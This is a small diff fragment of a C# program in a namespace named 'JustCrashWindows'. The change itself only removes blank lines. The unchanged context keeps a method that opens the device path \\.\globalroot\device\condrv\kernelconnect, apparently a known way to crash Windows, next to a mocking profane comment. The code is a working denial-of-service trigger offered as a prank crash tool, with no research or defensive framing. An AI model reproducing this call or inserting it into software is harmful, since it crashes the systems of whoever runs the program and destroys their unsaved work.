@@ -22,7 +22,5 @@ namespace JustCrashWindows
             //Fuck you :)
             File.OpenRead(@"\\.\globalroot\device\condrv\kernelconnect");
         }
-
-        
     }
 }
